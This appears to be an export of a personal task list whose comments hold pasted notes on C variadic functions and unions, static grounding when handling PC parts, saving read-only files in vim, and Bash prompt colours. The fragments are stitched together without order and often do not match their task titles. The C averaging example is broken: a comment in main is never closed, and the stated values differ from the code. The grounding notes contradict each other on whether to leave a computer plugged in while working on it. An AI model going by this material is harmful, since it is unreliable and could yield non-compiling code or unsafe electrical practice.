va_arg takes a va_list and a variable type, and returns the next argument in the list in the form of whatever variable type it is told. It then moves down the list to the next argument. For example, va_arg ( a_list, double ) will return the next argument, assuming it exists, in the form of a double. The next time it is called, it will return the argument following the last returned number, if one exists. Note that you need to know the type of each argument--that's part of why printf requires a format string! Once you're done, use va_end to clean up the list: va_end( a_list );

To show how each of the parts works, take an example function:

#include &lt;stdarg.h&gt;
#include &lt;stdio.h&gt;

/* this function will take the number of values to average
   followed by all of the numbers to average */
double average ( int num, ... )
{
    va_list arguments;                     
    double sum = 0;

    /* Initializing arguments to store all values after num */
    va_start ( arguments, num );           
    /* Sum all the inputs; we still rely on the function caller to tell us how
     * many there are */
    for ( int x = 0; x &lt; num; x++ )        
    {
        sum += va_arg ( arguments, double ); 
    }
    va_end ( arguments );                  // Cleans up the list

    return sum / num;                      
}

int main()
{
    /* this computes the average of 13.2, 22.3 and 4.5 (3 indicates the number of values to average) */
    printf( "%f\n", average ( 3, 12.2, 22.3, 4.5 ) );
    /* here it computes the average of the 5 values 3.3, 2.2, 1.1, 5.5 and 3.3
    printf( "%f\n", average ( 5, 3.3, 2.2, 1.1, 5.5, 3.3 ) );
}

It isn't necessarily a good idea to use a variable argument list at all times; the potential exists for assuming a value is of one type, while it is in fact another, such as a null pointer being assumed to be an integer. Consequently, variable argument lists should be used sparingly. </COMMENTS></TASK><TASK ID="159" TITLE="https://gcc.gnu.org/onlinedocs/cpp/Macros.html" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42332.00000000" STARTDATESTRING="11/24/2015" CREATIONDATE="42332.69417824" CREATIONDATESTRING="11/24/2015 4:39 PM" LASTMOD="42332.69418981" LASTMODSTRING="11/24/2015 4:39 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"/><TASK ID="258" TITLE="http://www.linuxforums.org/forum/programming-scripting/120051-process-h-no-such-file-directory.html" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="2" RISK="0" PERCENTDONE="0" STARTDATE="42415.00000000" STARTDATESTRING="2/15/2016" CREATIONDATE="42415.88856481" CREATIONDATESTRING="2/15/2016 9:19 PM" LASTMOD="42418.93915509" LASTMODSTRING="2/18/2016 10:32 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="10544896" PRIORITYWEBCOLOR="#00E7A0"><COMMENTS>#ifdef _MSC_VER // Windows

There is no simple way, because the actual operation is not simple. When the file is stored on the disk, there are no empty available bytes before the beginning of the file, so you can't just put data there. There isn't an ideal generic solution to this -- usually, it means copying all of the rest of the data to move it to make room.

Thus, C makes you decide how you want to solve that problem.</COMMENTS></TASK><TASK ID="4" TITLE="project ideas.txt" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="0" RISK="0" PERCENTDONE="0" STARTDATE="42317.00000000" STARTDATESTRING="11/9/2015" CREATIONDATE="42317.52814815" CREATIONDATESTRING="11/9/2015 12:40 PM" LASTMOD="42332.69525463" LASTMODSTRING="11/24/2015 4:41 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="57630" PRIORITYWEBCOLOR="#1EE100"><COMMENTS>float masterfunc( int X, ...){

Java:

String str = new String("Hello");

Python:

Both Java and Python have the concept of a "string", C does not have the concept of a "string". C has character arrays which can come in "read only" or manipulatable.

C:

char * str = "Hello";  // the string "Hello\0" is pointed to by the character pointer

There's no new/delete expression in C.

The closest equivalent are the malloc and free functions, if you ignore the constructors/destructors and type safety.

#include &lt;stdlib.h&gt;

int* p = malloc(sizeof(*p));   // int* p = new int;
...
free(p);                       // delete p;

int* a = malloc(12*sizeof(*a));  // int* a = new int[12];
...
free(a);                         // delete[] a;

Unions
Unions allow one portion of memory to be accessed as different data types. Its declaration and use is similar to the one of structures, but its functionality is totally different:


union type_name {
  member_type1 member_name1;
  member_type2 member_name2;
  member_type3 member_name3;
  .
  .
} object_names;


This creates a new union type, identified by type_name, in which all its member elements occupy the same physical space in memory. The size of this type is the one of the largest member element. For example:

1
2
3
4
5

	

union mytypes_t {
  char c;
  int i;
  float f;
} mytypes;

	


declares an object (mytypes) with three members:

1
2
3

	

mytypes.c
mytypes.i
mytypes.f

	


Each of these members is of a different data type. But since all of them are referring to the same location in memory, the modification of one of the members will affect the value of all of them. It is not possible to store different values in them in a way that each is independent of the others.

One of the uses of a union is to be able to access a value either in its entirety or as an array or structure of smaller elements. For example:

1
2
3
4
5
6
7
8

	

union mix_t {
  int l;
  struct {
    short hi;
    short lo;
    } s;
  char c[4];
} mix;

	


If we assume that the system where this program runs has an int type with a size of 4 bytes, and a short type of 2 bytes, the union defined above allows the access to the same group of 4 bytes: mix.l, mix.s and mix.c, and which we can use according to how we want to access these bytes: as if they were a single value of type int, or as if they were two values of type short, or as an array of char elements, respectively. The example mixes types, arrays, and structures in the union to demonstrate different ways to access the data. For a little-endian system, this union could be represented as:


The exact alignment and order of the members of a union in memory depends on the system, with the possibility of creating portability issues.</COMMENTS></TASK><TASK ID="120" TITLE="answer: " REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" DONEDATE="42331.65640046" DONEDATESTRING="11/23/2015 3:45 PM" PERCENTDONE="100" STARTDATE="42331.00000000" STARTDATESTRING="11/23/2015" CREATIONDATE="42331.65475694" CREATIONDATESTRING="11/23/2015 3:42 PM" LASTMOD="42331.65642361" LASTMODSTRING="11/23/2015 3:45 PM" CALCPERCENTDONE="100" TEXTCOLOR="8421504" TEXTWEBCOLOR="#808080" PRIORITYCOLOR="57630" PRIORITYWEBCOLOR="#1EE100" GOODASDONE="1"><COMMENTS>idea:

Earth yourself by touching the case.
Even if the interior is painted ground yourself on the psu casing, plugged into mains but everything switched off. Simple as that. Doesn't matter where you build it, ground yourself first then handle components. Seriously, simple as that or just a five pound strap that does the same job. 

Well, when I work on computers, I don't usually work on them in a carpeted room. What I DO do, however, is unplug the power supply from the motherboard, and turn the power supply switch off at the rear of the power supply, but leave it plugged in to the wall with its grounded outlet. Then, before I touch anything important I touch the exterior of the power supply with a finger, which grounds me. Then I go ahead and work away, invariably in the course of whatever I am doing I end up touching flesh to the case every few seconds, which is of course connected to the power supply, which is grounded. Thus, constant grounding happens easily, and I don't fry components.

Likewise, if you are swapping cards, be in contact with any surface where you will put down the card, while holding the card, before letting the card touch the surface. (If you are wearing a wrist strap, you should still do this is the surface is not connected to the strap - if the card is earthed and the surface charged, that's still a difference in potential).

For extra brownie points, have the point of first contact between card and surface be something that is not part of the circuitry, so if there is a static discharge, it's not discharging directly through some IC pin.</COMMENTS><TASK ID="194" TITLE="ESD safety Plan" REFID="0" COMMENTSTYPE="849cf988-79fe-418a-a40d-01fe3afcab2c" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" DONEDATE="42419.42729167" DONEDATESTRING="2/19/2016 10:15 AM" PERCENTDONE="100" STARTDATE="42385.00000000" STARTDATESTRING="1/16/2016" CREATIONDATE="42385.57062500" CREATIONDATESTRING="1/16/2016 1:41 PM" LASTMOD="42419.42730324" LASTMODSTRING="2/19/2016 10:15 AM" CALCPERCENTDONE="100" TEXTCOLOR="8421504" TEXTWEBCOLOR="#808080" PRIORITYCOLOR="57630" PRIORITYWEBCOLOR="#1EE100" GOODASDONE="1" SUBTASKDONE="6/6"><COMMENTS>You would normally have a special wrist-strap, with a long lead connected to an Earth bonding point. It is very important that the lead has a safety resistor of at least 1 Mega ohm. This will protect you if you inadvertently touch a live device.

Best practice is to NOT leave equipment plugged in and switched off to give you a grounded surface because when you touch or hold on to this to ground yourself YOU HAVE NO CURRENT LIMITING SAFETY DEVICE in the circuit between yourself and ground, so if you do touch a live part (maybe the PSU is faulty and the outlet power switch has been wired in the non-hot line) - even perhaps something nearby like a faulty desk lamp or the printer that actually has the fault (and has blown up the PC), you do not experience a hand-to-hand fault current to ground, which is VERY DANGEROUS because the fault path is via your heart. This is why engineers who have to work on (high voltage) live equipment are supposed to keep one hand in a pocket - it stops them from getting a shock from the hand holding the screwdriver to the hand touching the equipment chassis; instead, they get a jolt down the leg which can flippin' hurt, but is less likely to kill them.

If you do not have the proper grounding wrist strap with safety resistor or an antistatic kit/workbench, just use the charge equalisation technique that Scott mentioned (with the equipment totally disconnected from the power outlet) OR just briefly touch a grounded metal pipe or connector and then work on the kit without holding onto anything grounded.

 To ground the case, you need it to be connected, and to ground yourself you then touch the case, but you don't actually need the case or yourself to be grounded - merely to be at the same potential as the rest of the machine (so that no charge will move between you and the machine when you touch it somewhere sensitive). Touching a grounded part of the case does that - equalises the potential - whether or not the machine is grounded. – Scott 

With regards to clothing, working naked is best but this may upset your friends/customers. Natural grown fibres/materials are next best - cotton or linen, but not wool or silk - so engineers that turn up in white cotton T-shirts and denim jeans with leather-soled shoes may look a tad casual but are less likely to be a walking static bomb. If you have to preserve a corporate appearance in front of your customers, a polyester suit may look the biz but may help you zap their server. </COMMENTS><CUSTOMCOMMENTS>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</CUSTOMCOMMENTS><TASK ID="202" TITLE="Do NOT leave the computer plugged in while working on it!"

IF THE POWER SUPPLY IS FAULTY AND STILL LIVE YOU WILL GET SHOCKED
And don't forget, unplug that computer before working on it.

You would normally have a special wrist-strap, with a long lead connected to an Earth bonding point. It is very important that the lead has a safety resistor of at least 1 Mega ohm. This will protect you if you inadvertently touch a live device.</COMMENTS><CUSTOMCOMMENTS>JwMAAHicLZLNbtswEIR7NpB3mFuBIjUo+R89GY3TGHXrIHYaGOCFliiJKE0K1MquEfjdu6Jy2RHJb3dnRb7LQEUilWtMDFldJukklbkuCiGdb03mT7WibsMqVyZiNHqXhXdER8sfQhbOWFlklQqNJoFlMMp+u93uBu/yiyy100GRD3gxWaXzVGA6HA0XUyFu8mz05a9x+Vi2WYK7gaxVyCX9G6WC43TcRSY5Juk8Cqd1sohAmkYinUQknUeEc6NMIjKaR2ScRGQ8jgjHTiZJRCbjiExmEZmK+UfvKLOIzEREZqOIzKYR4SJRerPz3u28t7vo7S56u4vebiI6v0WTTCG6Se8G60fsn1Z43r6tXrB7fX7eHLDe4XH5utkfsPz9gN1+vdlgs/6zwmH7irdu9WO1x+5p+/3n6qEvs3Q5cu8+EwofSk33kK2VR2nQutq2Zbd03ml5FNIIUKUI3aW2pAOOmpM0Lj7wTZTwDoaGfd0+HnzLp63N4Xw4KWuvqNRZQ6GpdcZ3jUswDX1tKKj6HhdDFZ9Zz8WsVjl3ck5npHOQh3JYqcDE0bu861d742iINcE0kEecdbjCnGofSDlix+j9UqX7cpVqutaq0HRF0A235sflCzDEQENI8EuXCr46DbGvuOzFWIs6eGIbuPI4pujFqZz7kXbEQ5Fvs+jc8HC5PptMf/wHfsqf/gPJuQoa</CUSTOMCOMMENTS></TASK><TASK ID="195" TITLE="remove static clothing" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" DONEDATE="42419.42729167" DONEDATESTRING="2/19/2016 10:15 AM" PERCENTDONE="100" STARTDATE="42385.00000000" STARTDATESTRING="1/16/2016" CREATIONDATE="42385.57068287" CREATIONDATESTRING="1/16/2016 1:41 PM" LASTMOD="42419.42730324" LASTMODSTRING="2/19/2016 10:15 AM" CALCPERCENTDONE="100" TEXTCOLOR="8421504" TEXTWEBCOLOR="#808080" PRIORITYCOLOR="57630" PRIORITYWEBCOLOR="#1EE100" GOODASDONE="1"><COMMENTS>1</COMMENTS></TASK><TASK ID="196" TITLE="clean workstation" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" DONEDATE="42419.42729167" DONEDATESTRING="2/19/2016 10:15 AM" PERCENTDONE="100" STARTDATE="42385.00000000" STARTDATESTRING="1/16/2016" CREATIONDATE="42385.57079861" CREATIONDATESTRING="1/16/2016 1:41 PM" LASTMOD="42419.42730324" LASTMODSTRING="2/19/2016 10:15 AM" CALCPERCENTDONE="100" TEXTCOLOR="8421504" TEXTWEBCOLOR="#808080" PRIORITYCOLOR="57630" PRIORITYWEBCOLOR="#1EE100" GOODASDONE="1"><COMMENTS>2</COMMENTS></TASK><TASK ID="197" TITLE="ground self" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" DONEDATE="42419.42729167" DONEDATESTRING="2/19/2016 10:15 AM" PERCENTDONE="100" STARTDATE="42385.00000000" STARTDATESTRING="1/16/2016" CREATIONDATE="42385.57091435" CREATIONDATESTRING="1/16/2016 1:42 PM" LASTMOD="42419.42730324" LASTMODSTRING="2/19/2016 10:15 AM" CALCPERCENTDONE="100" TEXTCOLOR="8421504" TEXTWEBCOLOR="#808080" PRIORITYCOLOR="57630" PRIORITYWEBCOLOR="#1EE100" GOODASDONE="1"><COMMENTS>3

Saving a read-only file edited in vi / vim

We’ve all done it opened a file using vi or vim to inspect the contents, and realize we need to alter it.  Of course we totally ignored the message informing we didn’t have permission to edit, so we’re only allowed to view it as “read-only”.  Then after we find the troublesome spot we hit “i” and happily edit the place needing changed, only to “face-palm” when we realize we cannot save the wonderful edit we just made.

In the past I handled this one of three ways: I either copied and pasted the change after reopening the file using sudo, or I reopened and retyped everything once again, or I save the file as a temp file and then rename it using sudo.  Very stupid, stressful and time consuming.

However, now I know a better way.  Using a combination of ‘tee’ and ‘sudo’ commands I can now save the read-only file rather than jumping through the hoops in the previous paragraph.  Here is how:

Open a file as normal, forgetting to use “sudo”, and therefore viewing a read-only file.
001-b_open_read_only

Then mistakenly try to edit the read-only file in the traditional manner.
002-b_insert-in-readonly-file

But when we try to save using ‘:w!’, SHIFT+ZZ, or :qw!, or whatever combination we normally fail with as an alternative.  Here is sample output of what we see:
003-b_try-to-save

At this point is where the new magic can happen. Instead of the normal “face-palm” we do not “ENTER” and move on. We can enter a new command and successfully save the file after entering the sudo password:
005-b_sudo-password

At this point we will be presented with the content of the file and a prompt to press ENTER or type another command. To simply save the file and move on we just press ENTER, and then press the letter “O” (oh). (NOTE: “L” seems to do pretty much the same thing.)  The file will be saved but remains open in vi/vim for more editing or reading.  We can now exit normally by typing “:q!” since the file is still open as “read-only”.
006-b_final-save

What the command does:

    :w = Write a file.
    !sudo = Call shell sudo command.
    tee = The output of the vi/vim write command is redirected using tee.
    % = Triggers the use of the current filename.
    Simply put, the ‘tee’ command is run as sudo and follows the vi/vim command on the current filename given.

Hit the Esc key; that goes into command mode. Then you can type

    :q to quit (short for :quit)
    :q! to quit without saving (short for :quit!)
    :wq to write and quit (think write and quit)
    :wq! to write and quit even if file has only read permission (if file does not have write permission: force write)
    :x to write and quit (shorter than :wq)
    :qa to quit all (short for :quitall)

When you press :, a : will appear at the bottom of the screen.

Or you can press Esc ZZ (Esc Shift+Z Shift+Z) to write/save if the file was changed, then quit.

Or if you don't want to save changes you can use ZQ instead.

Vim has extensive help, so type Esc:helpReturn and you will have all your answers and even a neat tutorial.</COMMENTS></TASK></TASK><TASK ID="279" TITLE="BASH" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="3" RISK="0" PERCENTDONE="0" STARTDATE="42417.00000000" STARTDATESTRING="2/17/2016" CREATIONDATE="42417.89425926" CREATIONDATESTRING="2/17/2016 9:27 PM" LASTMOD="42418.92775463" LASTMODSTRING="2/18/2016 10:15 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15388928" PRIORITYWEBCOLOR="#00D1EA" SUBTASKDONE="0/8"><COMMENTS>run program:

The factual accuracy of this article or section is disputed.

Reason: Raw escapes vs. tput, see Bash#Prompt customization (Discuss in Talk:Color Bash Prompt#)

You can add colors and additional information to the Bash's prompt (PS1) to increase productivity and make the prompt stand out.

This article shows how to customize the personal prompt of a regular user.

Applying changes

To apply changes made in ~/.bashrc without restarting your shell, source the script.
Basic prompts

The following settings are useful for distinguishing the root prompt from non-root users.
Regular user

A green prompt for regular users:
[chiri@zetsubou ~]$ _

~/.bashrc

#PS1='[\u@\h \W]\$ '  # Default
PS1='\[\e[1;32m\][\u@\h \W]\$\[\e[0m\] '

Root

A red prompt for root (copy from /etc/skel/, if not already):
[root@zetsubou ~]# _

/root/.bashrc

#PS1='[\u@\h \W]\$ '  # Default
PS1='\[\e[1;31m\][\u@\h \W]\$\[\e[0m\] '

Note: Also copy .bash_profile from /etc/skel/ to /root/, to make sure that your colours persist in su shells.
Professional prompts

The following settings provides more professional prompts.
Regular user

A green/blue prompt for regular users:
chiri ~/docs $ echo "sample output text"
sample output text
chiri ~/docs $ _

PS1='\[\e[0;32m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[1;32m\]\$\[\e[m\] \[\e[1;37m\]'

This will give a very pleasing, colorful prompt and theme for the console with bright white text.

The string above contains color-set escape sequences (start coloring: \[\e[color\], end coloring: \[\e[m\]) and information placeholders:

    \u - Username. The original prompt also has \h, which prints the host name.
    \w - Current absolute path. Use \W for current relative path.
    \$ - The prompt character (eg. # for root, $ for regular users).
    \[ and \] - These tags should be placed around color codes so bash knows how to properly place the cursor.

The last color-set sequence, \[\e[1;37m\], is not closed, so the remaining text (everything typed into the terminal, program output and so on) will be in that (bright white) color. It may be desirable to change this color, or to delete the last escape sequence in order to leave the actual output in unaltered color.
Root

A red/blue prompt for root:
root ~/docs # echo "sample output text"
sample output text
root ~/docs # _

PS1='\[\e[0;31m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[0;31m\]\$ \[\e[m\]\[\e[0;32m\]'

This will give you a red designation and green console text.
Ultimate prompts
Load/Mem Status for 256colors

This is not even pushing the limits. Other than using sed to parse the memory and load average (using the -u option for non-buffering), and the builtin history to save your history to your HISTFILE after every command, which you may find incredibly useful when dealing with crashing shells or subshells, this is essentially just making BASH print variables it already knows, making this extremely fast compared to prompts with non-builtin commands.

This prompt is from AskApache.com's BASH Power Prompt article, which goes into greater detail. It is especially helpful for those wanting to understand 256 color terminals, ncurses, termcap, and terminfo.

This is for 256 color terminals, which is where the \033[38;5;22m terminal escapes come from.

To use in commands from your shell environment:
$ echo -e "${txtblu}test"
test
$ echo -e "${bldblu}test"
test
$ echo -e "${undblu}test"
test
$ echo -e "${bakblu}test"
test
$ _

PS1="\[$txtblu\]foo\[$txtred\] bar\[$txtrst\] baz : "

Double quotes enable $color variable expansion and the \[ \] escapes around them make them not count as character positions and the cursor position is not wrong.
Note: If experiencing premature line wrapping when entering commands, then missing escapes (\[ \]) is most likely the reason.
Prompt escapes

The various Bash prompt escapes listed in the manpage:

Bash allows these prompt strings to be customized by inserting a
number of backslash-escaped special characters that are
decoded as follows:

	\a		an ASCII bell character (07)
	\d		the date in "Weekday Month Date" format (e.g., "Tue May 26")
	\D{format}	the format is passed to strftime(3) and the result
			  is inserted into the prompt string an empty format
			  results in a locale-specific time representation.
			  The braces are required
	\e		an ASCII escape character (033)
	\h		the hostname up to the first `.'
	\H		the hostname
	\j		the number of jobs currently managed by the shell
	\l		the basename of the shell's terminal device name
	\n		newline
	\r		carriage return
	\s		the name of the shell, the basename of $0 (the portion following
			  the final slash)
	\t		the current time in 24-hour HH:MM:SS format
	\T		the current time in 12-hour HH:MM:SS format
	\@		the current time in 12-hour am/pm format
	\A		the current time in 24-hour HH:MM format
	\u		the username of the current user
	\v		the version of bash (e.g., 2.00)
	\V		the release of bash, version + patch level (e.g., 2.00.0)
	\w		the current working directory, with $HOME abbreviated with a tilde
	\W		the basename of the current working directory, with $HOME
			 abbreviated with a tilde
	\!		the history number of this command
	\#		the command number of this command
	\$		if the effective UID is 0, a #, otherwise a $
	\nnn		the character corresponding to the octal number nnn
	\\		a backslash
	\[		begin a sequence of non-printing characters, which could be used
			  to embed a terminal control sequence into the prompt
	\]		end a sequence of non-printing characters

	The command number and the history number are usually different:
	the history number of a command is its position in the history
	list, which may include commands restored from the history file
	(see HISTORY below), while the command number is the position in
	the sequence of commands executed during the current shell session.
	After the string is decoded, it is expanded via parameter
	expansion, command substitution, arithmetic expansion, and quote
	removal, subject to the value of the promptvars shell option (see
	the description of the shopt command under SHELL BUILTIN COMMANDS
	below).

Positioning the cursor

The following sequence sets the cursor position:

\[\033[&lt;row&gt;;&lt;column&gt;f\]

The current cursor position can be saved using:

\[\033[s\]

To restore a position, use the following sequence:

\[\033[u\]


The following example uses these sequences to display the time in the upper right corner:

PS1="&gt;\[\033[s\]\[\033[1;\$((COLUMNS-5))f\]\$(date +%H:%M)\[\033[u\]"

The environment variable COLUMNS contains the number of columns of the terminal. The above example substracts 5 from its value in order to justify the five-character wide output of date at the right border.
Return value visualisation

Use the following prompt to see the return value of last command:
0 ;) : true
0 ;) : false
1 ;( :

#return value visualisation
PS1="\$? \$(if [[ \$? == 0 ]]; then echo \"\[\033[0;32m\];)\"; else echo \"\[\033[0;31m\];(\"; fi)\[\033[00m\] : "

Zero is a green smiley and non-zero a red one. So your prompt will smile if the last operation was successful.

But you will probably want to include the username and hostname as well, like this:
0 ;) andy@alba ~ $ true
0 ;) andy@alba ~ $ false
1 ;( andy@alba ~ $ _

#return value visualisation
PS1="\[\033[01;37m\]\$? \$(if [[ \$? == 0 ]]; then echo \"\[\033[01;32m\];)\"; else echo \"\[\033[01;31m\];(\"; fi) $(if [[ ${EUID} == 0 ]]; then echo '\[\033[01;31m\]\h'; else echo '\[\033[01;32m\]\u@\h'; fi)\[\033[01;34m\] \w \$\[\033[00m\] "

Or, if you want, you can build your prompt using the ✓ unicode symbol for a zero status and the ✗ unicode symbol for a nonzero status:
0 ✓ andy@alba ~ $ true
0 ✓ andy@alba ~ $ false
1 ✗ andy@alba ~ $ I\ will\ try\ to\ type\ a\ wrong\ command...
bash: I will try to type a wrong command...: command not found
127 ✗ andy@alba ~ $ _

#return value visualisation
PS1="\[\033[01;37m\]\$? \$(if [[ \$? == 0 ]]; then echo \"\[\033[01;32m\]\342\234\223\"; else echo \"\[\033[01;31m\]\342\234\227\"; fi) $(if [[ ${EUID} == 0 ]]; then echo '\[\033[01;31m\]\h'; else echo '\[\033[01;32m\]\u@\h'; fi)\[\033[01;34m\] \w \$\[\033[00m\] "

Alternatively, this can be made more readable with PROMPT_COMMAND:

set_prompt () {
    Last_Command=$? # Must come first!
    Blue='\[\e[01;34m\]'
    White='\[\e[01;37m\]'
    Red='\[\e[01;31m\]'
    Green='\[\e[01;32m\]'
    Reset='\[\e[00m\]'
    FancyX='\342\234\227'
    Checkmark='\342\234\223'

    # Add a bright white exit status for the last command
    PS1="$White\$? "
    # If it was successful, print a green check mark. Otherwise, print
    # a red X.
    if [[ $Last_Command == 0 ]]; then
        PS1+="$Green$Checkmark "
    else
        PS1+="$Red$FancyX "
    fi
    # If root, just print the host in red. Otherwise, print the current user
    # and host in green.
    if [[ $EUID == 0 ]]; then
        PS1+="$Red\\h "
    else
        PS1+="$Green\\u@\\h "
    fi
    # Print the working directory and prompt marker in blue, and reset
    # the text color to the default.
    PS1+="$Blue\\w \\\$$Reset "
}
PROMPT_COMMAND='set_prompt'

Here is an alternative that only includes the error status, if non-zero:

PROMPT_COMMAND='es=$?; [[ $es -eq 0 ]] &amp;&amp; unset error || error=$(echo -e "\e[1;41m $es \e[40m")'
PS1="${error} ${PS1}"

Tips and tricks
Different colors for text entry and console output

If you do not reset the text color at the end of your prompt, both the text you enter and the console text will simply stay in that color. If you want to edit text in a special color but still use the default color for command output, you will need to reset the color after you press Enter, but still before any commands get run. You can do this by installing a DEBUG trap, like this:

~/.bashrc

trap 'printf "\e[0m" "$_"' DEBUG

Random quotations at logon

For a brown Fortune prompt, add:

~/.bashrc

[[ "$PS1" ]] &amp;&amp; echo -e "\e[00;33m$(/usr/bin/fortune)\e[00m"

Tom Gundersen wrote:
As systemd is now the default init system, Arch Linux is receiving minimal testing on initscripts systems. Due to a lack of resources and interest, we are unlikely to work on fixing initscripts-specific bugs, and may close them as WONTFIX.
We therefore strongly encourage all users to migrate to systemd as soon as possible. See the systemd migration guide [ https://wiki.archlinux.org/index.php/Systemd ].
To ease the transition, initscripts support will remain in the official repositories for the time being, unless otherwise stated. As of January 2013, we will start removing initscripts support (e.g., rc scripts) from individual packages without further notice.

The number of bugs in the Arch Linux bug tracker is creeping up so it is time for some extermination.
This is a great way for the community to get involved and help the Arch Linux team. The process is simple. First look at a bug for your favorite piece of software in the bug tracker and check if it still occurs. If it does, check the upstream project for a fix and test it to confirm it works. If there is no fix available, make sure the bug has been filed in the upstream tracker.
Join us on the #archlinux-bugs IRC channel. We are spread across timezones, so people should be around all day.

With GNOME 3.6, polkit and networkmanager moving to [extra], ConsoleKit has now been removed from the repositories. Any package that previously depended on it now relies on systemd-logind instead. That means that the system must be booted with systemd to be fully functional.
In addition to GNOME, both KDE and XFCE are also affected by this change.

The base group now contains the systemd-sysvcompat package. This means that all new installations will boot with systemd by default.
As some packages still lack native systemd units, users can install the initscripts package and use the DAEMONS array in /etc/rc.conf to start services using the legacy rc.d scripts.
This change does not affect existing installations. For the time being, the initscripts and sysvinit packages remain available from our repositories. However, individual packages may now start relying on the system being booted with systemd.
Please refer to the wiki [ https://wiki.archlinux.org/index.php/Systemd ] for how to transition an existing installation to systemd.

Colors overview

The page at http://ascii-table.com/ansi-escape-sequences.php describes the various available color escapes. The following Bash function displays a table with ready-to-copy escape codes.

~/.bashrc

colors() {
	local fgc bgc vals seq0

	printf "Color escapes are %s\n" '\e[${value};...;${value}m'
	printf "Values 30..37 are \e[33mforeground colors\e[m\n"
	printf "Values 40..47 are \e[43mbackground colors\e[m\n"
	printf "Value  1 gives a  \e[1mbold-faced look\e[m\n\n"

	# foreground colors
	for fgc in {30..37}; do
		# background colors
